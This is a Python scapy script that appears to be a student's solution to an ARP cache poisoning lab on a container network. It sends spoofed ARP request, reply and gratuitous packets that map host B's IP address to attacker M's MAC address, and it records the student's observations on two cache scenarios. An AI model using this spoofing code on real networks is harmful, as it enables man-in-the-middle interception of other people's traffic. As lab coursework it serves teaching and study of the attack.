from scapy.all import *

def Task1_A(AMAC_addr, MMAC_addr, AIP_addr, BIP_Addr):
    '''
        - On host M, construct an ARP request packet to map B's IP address to M's MAC address.
        - Send the packet to A and check whether the attack is successful or not.
    '''
    # ARP operation code
    # 1: Request
    # 2: Reply

    # ARP type: 0x0806
    e = Ether(src = MMAC_addr, dst = AMAC_addr, type= 0x0806)

    # ARP packet
    # hwsrc: Hardware Source
    # hwdst: Hardware Destination
    # psrc: Layer 3 address of source field
    # pdst: Layer 3 address of destination field
       
    a = ARP(op= 1, psrc = BIP_Addr, pdst = AIP_addr)

    pkt = e/a
    pkt.show()
    
    # Send fake packet to target A
    sendp(pkt)
    print("=> Sending successfully")

def Task1_B(sce, AMAC_addr, MMAC_addr, AIP_addr, BIP_Addr):
    """
        - On host M, construct an ARP reply packet to map B's IP address to M's MAC address. 
        - Send the packet to A and check whether the attack is successful or not. 
        - Try the attack under the following two scenarios, and report the results of your attack:
            + Scenario 1: B's IP is already in A's cache.
            + Scenario 2: B's IP is not in A's cache. You can use the command "arp -d a.b.c.d" to
                remove the ARP cache entry for the IP address a.b.c.d.
    """
    
    if(sce == 1):
        print('Remember to use host B ping to host A! Then run the program again and choose sce = 2!')
        sys.exit()
    
    e = Ether(src= MMAC_addr, dst= AMAC_addr, type= 0x0806)

    a = ARP(op= 2, psrc= BIP_Addr, pdst= AIP_addr)

    pkt = e/a
    pkt.show()
    sendp(pkt)
    print('=> Sending successfully!')

    # Answer in my observation:
    '''
      - In scenario 1
            + Ping host B to host A so that the ARP table will save IP and MAC address of host B.
            + When sending ARP Reply to host A, it will replace the MAC address of host B into host M's.

     - In scenario 2, the packet still sent to the target A but it was not saved in ARP cache.
    '''

def Task1_C(sce, MMAC_addr, BIP_Addr):
    """
        - On host M, construct an ARP gratuitous packet, and use it to map B's IP address to M's MAC address.
        - Please launch the attack under the same two scenarios as those described in Task 1.B.
        - ARP gratuitous packet is a special ARP request packet. 
            + It is used when a host machine needs to update outdated information on all the other machine's ARP cache.
            + The gratuitous ARP packet has the following characteristics:
                *** The source and destination IP addresses are the same, and they are the IP address of the host
                        issuing the gratuitous ARP.
                *** The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC
                        address (ff:ff:ff:ff:ff:ff).
                *** No reply is expected.
    """

    if(sce == 1):
        print('Remember to use host B ping to host A! Then run the program again and choose sce = 2!')
        sys.exit()

    # Create an ARP gratuitous packet
    e = Ether(src= MMAC_addr, dst= 'ff:ff:ff:ff:ff:ff', type = 0x0806)
    a = ARP(op= 1, psrc=BIP_Addr, pdst= BIP_Addr, hwdst= 'ff:ff:ff:ff:ff:ff')       # Must declare hwdst otherwise Wireshark will think it is an Announcement ARP
    pkt = e/a
    pkt.show()

    sendp(pkt)

    # Answer in my observation:
    """
        - Scenario 1: 
            + When using host B ping to host A, the ARP table in host A will save IP and MAC Address
                of host B, then when host M sends to host B a gratuitous ARP packet (request/reply).
            + The ARP table in host A will automatically replace the MAC Address of host B 
                to MAC address of host M, and the IP Addres still use host B.

        - Scenario 2: Host M sends gratuitous ARP packet (request/reply) to host B successfully but the ARP table
            in host A does not update.
    """

id = int(input('Select task: '))
AMAC_addr = '02:42:0a:09:00:05'
BMAC_addr = '02:42:0a:09:00:06'
MMAC_addr = '02:42:0a:09:00:69'

AIP_addr = '10.9.0.5'
BIP_Addr = '10.9.0.6'

if id == 1:
    Task1_A(AMAC_addr, MMAC_addr, AIP_addr, BIP_Addr)

else:
    sce = int(input('Choose scenario:'))
    if(sce < 1 or sce > 2):
        print('Invalid value!')
        sys.exit()
    
    if id == 2:
        Task1_B(sce, AMAC_addr, MMAC_addr, AIP_addr, BIP_Addr)
        
    elif id == 3:    
        Task1_C(sce, MMAC_addr, BIP_Addr)